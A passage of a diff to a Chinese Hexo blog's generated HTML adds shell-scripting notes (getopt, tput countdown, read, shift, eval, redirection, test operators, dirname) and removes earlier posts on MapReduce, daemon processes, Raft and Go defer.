"$&#123;ARGS&#125;"</span><br><span class="line">while true; do</span><br><span class="line">    case "$1" in</span><br><span class="line">    -c|--count)</span><br><span class="line">        count="$2"</span><br><span class="line">        shift 2</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">;;这是<span class="keyword">case</span>语法</span></span><br><span class="line">        ;;</span><br><span class="line">    -p|--pid)</span><br><span class="line">        pid="$2"</span><br><span class="line">        shift 2</span><br><span class="line">        ;;</span><br><span class="line">    -h|--help)</span><br><span class="line">        usage</span><br><span class="line">        ;;</span><br><span class="line">    --)</span><br><span class="line">        shift</span><br><span class="line">        break</span><br><span class="line">        ;;</span><br><span class="line">    esac</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+
+<p><code>getopt</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">-a, --alternative</span><br><span class="line">              Allow long options to start with a single ‘-’.</span><br><span class="line"></span><br><span class="line">-l, --longoptions longopts 支持的长选项，由冒号和字符组成类似getopts</span><br><span class="line"></span><br><span class="line">-o, --options shortopts 支持的短选项，同上</span><br><span class="line"></span><br><span class="line">-n, --name progname 命令就是通过该名称被调用</span><br><span class="line"></span><br><span class="line">-- "$@" 将所有参数列表当作getopt入参,</span><br></pre></td></tr></table></figure>
+
+<h2 id="倒计时效果"><a href="#倒计时效果" class="headerlink" title="倒计时效果"></a>倒计时效果</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">sc 保存当前光标位置</span></span><br><span class="line"><span class="meta">#</span><span class="bash">rc 恢复光标到最后保存位置</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">ed 向前清除一个字符</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">tput.sh</span></span><br><span class="line"></span><br><span class="line">tput sc</span><br><span class="line"></span><br><span class="line">count=10;</span><br><span class="line"></span><br><span class="line">while true; do</span><br><span class="line"></span><br><span class="line">  if [ $count -gt 1 ]; then</span><br><span class="line"></span><br><span class="line">        let count--;</span><br><span class="line"></span><br><span class="line">        sleep 1;</span><br><span class="line"></span><br><span class="line">        tput rc</span><br><span class="line"></span><br><span class="line">        tput ed</span><br><span class="line"></span><br><span class="line">        echo -n $count Seconds;</span><br><span class="line"></span><br><span class="line">        else</span><br><span class="line"></span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">    fi</span><br><span class="line"></span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+
+<h2 id="read命令"><a href="#read命令" class="headerlink" title="read命令"></a>read命令</h2><p>A:read后面的变量只有name一个，也可以有多个，这时如果输入多个数据，则第一个数据给第一个变量，第二个数据给第二个变量，如果输入数 据个数过多，则最后所有的值都给第一个变量。如果太少输入不会结束。在read命令行中也可以不指定变量.如果不指定变量，那么read命令会将接收到的数据放置在环境变量REPLY中</p>
+<p><code>-p参数，允许在read命令行中直接指定一个提示</code></p>
+<p>B:计时输入</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if read -t 5 -p "please enter your name:" name</span><br><span class="line">then </span><br><span class="line">    echo "hello $name ,welcome to my script"</span><br><span class="line">else</span><br><span class="line">    echo "sorry,too slow"</span><br><span class="line">fi</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>
+
+<h2 id="格式化输出-echo-“-date-Y-m-d-H-M-S-该服务器没有安装-MySQL-Server”"><a href="#格式化输出-echo-“-date-Y-m-d-H-M-S-该服务器没有安装-MySQL-Server”" class="headerlink" title="格式化输出  echo “$(date +%Y-%m-%d\ %H:%M:%S) ** 该服务器没有安装 MySQL Server”"></a>格式化输出  echo “$(date +%Y-%m-%d\ %H:%M:%S) <strong>**</strong> 该服务器没有安装 MySQL Server”</h2><h2 id="eval-用法"><a href="#eval-用法" class="headerlink" title="eval 用法"></a>eval 用法</h2><h2 id="shift"><a href="#shift" class="headerlink" title="shift"></a>shift</h2><p>A:位置参数可以用shift命令左移。比如<code>shift 3</code>表示原来的<code>$4</code>现在变成<code>$1</code>，原来的<code>$5</code>现在变成<code>$2</code>等等，原来的<code>$1</code>、<code>$2</code>、<code>$3</code>丢弃，<code>$0</code>不移动。不带参数的<code>shift</code>命令相当于<code>shift 1</code></p>
+<p>B:Shift 命令还有另外一个重要用途, Bsh 定义了9个位置变量，从 <code>$1</code> 到<code>$9</code>,这并不意味着用户在命令行只能使用9个参数，借助 shift 命令可以访问多于9个的参数。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">shift.sh</span></span><br><span class="line"></span><br><span class="line">if [ $# -eq 0 ]</span><br><span class="line">then</span><br><span class="line">echo "Usage:x_shift2.sh 参数"</span><br><span class="line">exit 1</span><br><span class="line">fi</span><br><span class="line">sum=0</span><br><span class="line">until [ $# -eq 0 ]</span><br><span class="line">do</span><br><span class="line">sum=`expr $sum + $1`</span><br><span class="line">shift</span><br><span class="line">done</span><br><span class="line">echo "sum is: $sum"</span><br></pre></td></tr></table></figure>
+
+<p><code>./shift.sh 10 20 15</code></p>
+<h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><p>eval命令将会首先扫描命令行进行所有的替换，然后再执行命令。该命令使用于那些一次扫描无法实现其功能的变量。该命令对变量进行两次扫描。这些需要进行两次扫描的变量有时候被称为复杂变量</p>
+<p><code>eval set -- &quot;{value}&quot;</code></p>
+<p> If no arguments follow this option, then the positional parameters are unset. Otherwise, the positional parameters are set to the args, even if some of them begin with a -.(即使有些参数是以-开头的，只要有参数，都会被设置位置参数)</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">eval</span>也可以用于回显简单变量，不一定时复杂变量。</span></span><br><span class="line">NAME=ZONE</span><br><span class="line">eval echo $NAME等价于echo $NAME</span><br><span class="line"><span class="meta">#</span><span class="bash">两次扫描</span></span><br><span class="line">test.txt内容：hello shell world!</span><br><span class="line">myfile="cat test.txt"</span><br><span class="line">(1)echo $myfile　　#result:cat test.txt</span><br><span class="line">(2)eval echo $myfile　　#result:hello shell world!</span><br><span class="line">从（2）可以知道第一次扫描进行了变量替换，第二次扫描执行了该字符串中所包含的命令</span><br><span class="line"><span class="meta">#</span><span class="bash">获得最后一个参数</span></span><br><span class="line">echo "Last argument is $(eval echo \$$#)"</span><br><span class="line">echo "Last argument is $(eval echo $#)"</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-gt-dev-null-true"><a href="#2-gt-dev-null-true" class="headerlink" title="2&gt; /dev/null || true"></a><code>2&gt; /dev/null || true</code></h2><p>Regarding || true - If command return non 0 (zero) exit status (that usually indicating some type of error/failure) then true forcible set exit status code to 0 (zero) indicating success</p>
+<p>stdin（标准输入，文件描述符0），stdout（标准输出，文件描述符1）和stderr（标准错误，文件描述符2）</p>
+<p><code>2&gt; /dev/null</code>将错误信息丢弃</p>
+<p><code>2&gt;＆1</code> 将标准错误重定向到标准输出的地址（＆1）</p>
+<p><code>&amp;&gt;/dev/null</code> 所有IO重定向(&amp;&gt;中的&amp;可以代表任意，0，1，2，3……)</p>
+<p><a href="https://superuser.com/questions/1179844/what-does-dev-null-21-true-mean-in-linux" target="_blank" rel="noopener">https://superuser.com/questions/1179844/what-does-dev-null-21-true-mean-in-linux</a></p>
+<h2 id="amp-amp-与-和-amp"><a href="#amp-amp-与-和-amp" class="headerlink" title="&amp;&amp;与|| 和&amp;"></a>&amp;&amp;与|| 和&amp;</h2><p><code>&amp;</code>放在启动参数后面表示设置此进程为后台进程,一般为了防止信息输出干扰屏幕可以<code>ping 127.0.0.1 &amp;&gt;/dev/null &amp;</code></p>
+<p><code>command1 &amp;&amp; command2</code>,如果command1执行<code>成功</code>,那么执行command2</p>
+<p><code>command1 || command2</code>,如果command1执行<code>失败</code>,那么执行command2</p>
+<h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><ul>
+<li>算术运算符</li>
+</ul>
 <ul>
-<li>map worker<ul>
-<li>map任务执行完成后宕机：因为中间数据存储在本地磁盘，需要重新执行。</li>
-<li>map任务执行完成前宕机：需要重新执行</li>
+<li>关系运算符</li>
 </ul>
-</li>
-<li>reduce worker<ul>
-<li>reduce任务执行完成后宕机：因为数据存储在GFS，不需要重新执行</li>
-<li>reduce任务执行完成前宕机：需要重新执行，输出文件可以覆盖原来的（文件名一样）</li>
-</ul>
-</li>
-</ul>
-<h4 id="Master故障"><a href="#Master故障" class="headerlink" title="Master故障"></a>Master故障</h4><p>master宕机，任务失败,可以简单的通过周期写快照的方式来处理master故障</p>
-<h3 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h3><ul>
-<li>局部性：MapReduce用于大数据集的处理，其主要瓶颈是网络带宽。通过优化调度，可以让执行MapReduce任务的机器尽可能靠近机器。（同一机器==&gt;同一机架==&gt;同一机房…）</li>
-<li>任务粒度：执行MapReduce任务的过程其实就是M个Map任务+R个Reduce任务。M和R必须比机器数大很多才会有利于负载均衡</li>
-<li>备份任务：当MapReduce任务即将执行完成时，MapReduce框架会针对那些还在执行的任务，启动一个对应的备份任务。之后，只要主任务或备份任务执行完成，MapReduce任务就完成了。这样可以有效避免整个MapReduce任务被少部分比较慢的机器拖死</li>
-</ul>
-<h3 id="mapReduce试用范围"><a href="#mapReduce试用范围" class="headerlink" title="mapReduce试用范围"></a>mapReduce试用范围</h3><ul>
-<li>要想使用mapreduce首先要确保输入可以相对独立的进行计算(map),数据之间没有计算依赖关系</li>
-</ul>
-<h3 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h3><ol>
-<li><p>一个mapreduce中,reduce是否需要等待所有mapper执行后才执行?<br>需要,在 mapper 结束之前，reducer 很难知道属于一个 key 的数据是否收集完整，因此如果过早地开始 reduce，无法保值结果的正确性</p>
-</li>
-<li><p>如果一个mapper执行特别慢会拖慢整个任务(长尾现象)<br>为了应对长尾现象（一个特别慢的子任务拖慢整个任务），MapReduce提供了 Backup Task的机制：当一个MapReduce接近结束时，master 对还处理 in-progress状态的task额外的调度备份执行，当primary和backup中一个执行成功就标记成功。</p>
-</li>
-<li><p>Mapreduce中Map与Reduce任务的个数如何确定<br><a href="https://blog.csdn.net/lb812913059/article/details/79898818" target="_blank" rel="noopener">Mapreduce中Map与Reduce任务的个数</a></p>
-</li>
-</ol>
-<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://blog.bizcloudsoft.com/wp-content/uploads/Google-MapReduce%E4%B8%AD%E6%96%87%E7%89%88_1.0.pdf" target="_blank" rel="noopener">Google-MapReduce中文版</a><br><a href="https://static.googleusercontent.com/media/research.google.com/zh-CN//archive/mapreduce-osdi04.pdf" target="_blank" rel="noopener">Google-MapReduc</a><br><a href="https://www.jianshu.com/p/7c6e06d9e493" target="_blank" rel="noopener">论文笔记：MapReduce</a><br><a href="https://blog.csdn.net/zhangyifei216/article/details/53231054" target="_blank" rel="noopener">MapReduce论文笔记</a><br><a href="https://matt33.com/2016/03/02/hadoop-shuffle/" target="_blank" rel="noopener">MapReduce之Shuffle过程详述</a><br><a href="https://blog.csdn.net/zhanglh046/article/details/78360762" target="_blank" rel="noopener">https://blog.csdn.net/zhanglh046/article/details/78360762</a><br><a href="https://github.com/feixiao/Distributed-Systems" target="_blank" rel="noopener">https://github.com/feixiao/Distributed-Systems</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/18/操作系统/进程/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/11/18/操作系统/进程/" itemprop="url">进程</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-18T17:04:07+08:00">
-                2019-11-18
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/操作系统/" itemprop="url" rel="index">
-                    <span itemprop="name">操作系统</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="什么是守护进程"><a href="#什么是守护进程" class="headerlink" title="什么是守护进程"></a>什么是守护进程</h2><p>简单说,守护进程是在后台运行不受终端控制的进程</p>
-<h2 id="守护进程与孤儿进程区别联系"><a href="#守护进程与孤儿进程区别联系" class="headerlink" title="守护进程与孤儿进程区别联系"></a>守护进程与孤儿进程区别联系</h2><ul>
-<li>孤儿进程是因为父进程异常结束了，然后被1号进程init收养。守护进程是创建守护进程时有意把父进程结束，然后被1号进程init收养,</li>
-<li>虽然他们都会被init进程收养，但是他们是不一样的进程。守护进程会随着系统的启动默默地在后台运行，周期地完成某些任务或者等待某个事件的发生，直到系统关闭守护进程才会结束。孤儿进程则不是，孤儿进程会因为完成使命后结束运行。</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/14/分布式/MIT 6.824/论文/Hadoop中的mapReduce/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/11/14/分布式/MIT 6.824/论文/Hadoop中的mapReduce/" itemprop="url">Hadoop的MapReduce</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-14T10:58:48+08:00">
-                2019-11-14
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/MT6-248/" itemprop="url" rel="index">
-                    <span itemprop="name">MT6.248</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>Hadoop的MapReduce是对MapReduce的工程实践,做了大量的优化</p>
-<ol>
-<li>MapReduce中排序发生在哪几个阶段？？这些排序是否可以避免，为什么？？<br>一个MapReduce作业由Map阶段和Reduce阶段两部分组成，这两阶段会对数据排序,</li>
-</ol>
+<p>关系运算符只支持数字，不支持字符串，除非字符串的值是数字。<br>下表列出了常用的关系运算符，假定变量 a 为 10，变量 b 为 20：</p>
 <ul>
-<li>Map Task会在本地磁盘输出一个按照key排序（采用的是快速排序）的文件( 实际上Map阶段的排序就是为了减轻Reduce端排序负载)</li>
-<li>在Reduce阶段，每个Reduce Task会对收到的数据排序,</li>
+<li>布尔运算符<br>运算符    说明    举例<br>!    非运算，表达式为 true 则返回 false，否则返回 true。    <code>[ ! false ]</code> 返回 true。</li>
+<li>o    或运算，有一个表达式为 true 则返回 true。    <code>[ $a -lt 20 -o $b -gt 100 ]</code>返回 true。</li>
+<li>a    与运算，两个表达式都为 true 才返回 true。    <code>[ $a -lt 20 -a $b -gt 100 ]</code>返回 false。<ul>
+<li>逻辑运算符<br>运算符    说明    举例<br>&amp;&amp;    逻辑的 AND    <code>[[ $a -lt 100</code>&amp;&amp;<code>$b -gt 100 ]]</code> 返回 false<br>||    逻辑的 OR    <code>[[ $a -lt 100 || $b -gt 100 ]]</code> 返回 true</li>
+<li>字符串运算符<br>运算符    说明    举例<br>=    检测两个字符串是否相等，相等返回 true。    <code>[ $a = $b ]</code> 返回 false。<br>!=    检测两个字符串是否相等，不相等返回 true。    <code>[ $a != $b ]</code> 返回 true。</li>
 </ul>
-<ol start="2">
-<li>如何排序,用什么排序算法</li>
-</ol>
+</li>
+<li>z    检测字符串长度是否为0，为0返回 true。    <code>[ -z $a ]</code> 返回 false。</li>
+<li>n    检测字符串长度是否为0，不为0返回 true。    <code>[ -n $a ]</code> 返回 true。<br>str    检测字符串是否为空，不为空返回 true。    <code>[ $a ]</code> 返回 true。<ul>
+<li>文件测试运算符<br>操作符    说明    举例</li>
+</ul>
+</li>
+<li>b file    检测文件是否是块设备文件，如果是，则返回 true。    <code>[ -b $file ]</code>返回 false。</li>
+<li>c file    检测文件是否是字符设备文件，如果是，则返回 true。    <code>[ -c $file ]</code> 返回 false。</li>
+<li>d file    检测文件是否是目录，如果是，则返回 true。    <code>[ -d $file ]</code>返回 false。</li>
+<li>f file    检测文件是否是普通文件（既不是目录，也不是设备文件），如果是，则返回 true。    <code>[ -f $file ]</code> 返回 true。</li>
+<li>g file    检测文件是否设置了 SGID 位，如果是，则返回 true。    <code>[ -g $file ]</code>返回 false。</li>
+<li>k file    检测文件是否设置了粘着位(Sticky Bit)，如果是，则返回 true。    <code>[ -k $file ]</code>返回 false。</li>
+<li>p file    检测文件是否是有名管道，如果是，则返回 true。    <code>[ -p $file ]</code> 返回 false。</li>
+<li>u file    检测文件是否设置了 SUID 位，如果是，则返回 true。    <code>[ -u $file ]</code>返回 false。</li>
+<li>r file    检测文件是否可读，如果是，则返回 true。    <code>[ -r $file ]</code> 返回 true。</li>
+<li>w file    检测文件是否可写，如果是，则返回 true。    <code>[ -w $file ]</code> 返回 true。</li>
+<li>x file    检测文件是否可执行，如果是，则返回 true。    <code>[ -x $file ]</code> 返回 true。</li>
+<li>s file    检测文件是否为空（文件大小是否大于0），不为空返回 true。    <code>[ -s $file ]</code> 返回 true。</li>
+<li>e file    检测文件（包括目录）是否存在，如果是，则返回 true。    <code>[ -e $file ]</code>返回 true。<br><a href="http://www.runoob.com/linux/linux-shell-basic-operators.html" target="_blank" rel="noopener">Shell 基本运算符</a></li>
+</ul>
+<h2 id="dirname截取给定路径目录部分"><a href="#dirname截取给定路径目录部分" class="headerlink" title="dirname截取给定路径目录部分"></a>dirname截取给定路径目录部分</h2><p>1.示例1</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh  </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 跳转到脚本所在目录  </span></span><br><span class="line">cd $(dirname "$0") || exit 1</span><br></pre></td></tr></table></figure>
+
+<p>2.示例2</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">&gt; dirname /usr/bin/sort </span></span><br><span class="line">/usr/bin</span><br></pre></td></tr></table></figure>
+
+<p>#跳转到脚本所在目录，并输出当前目录地址到SCRIPTS_DIR变量，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SCRIPTS_DIR=&quot;$(cd $(dirname &quot;$0&quot;); pwd -P)&quot;</span><br></pre></td></tr></table></figure>
 
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/06/分布式/MIT 6.824/Lab 2: Raft/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/11/06/分布式/MIT 6.824/Lab 2: Raft/" itemprop="url">Lab 2: Raft</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-06T19:26:24+08:00">
-                2019-11-06
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/MT6-248/" itemprop="url" rel="index">
-                    <span itemprop="name">MT6.248</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p><a href="https://www.zhihu.com/question/54095779" target="_blank" rel="noopener">https://www.zhihu.com/question/54095779</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/04/go/defer/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/11/04/go/defer/" itemprop="url">defer</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-04T21:22:42+08:00">
-                2019-11-04
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/go/" itemprop="url" rel="index">
-                    <span itemprop="name">go</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
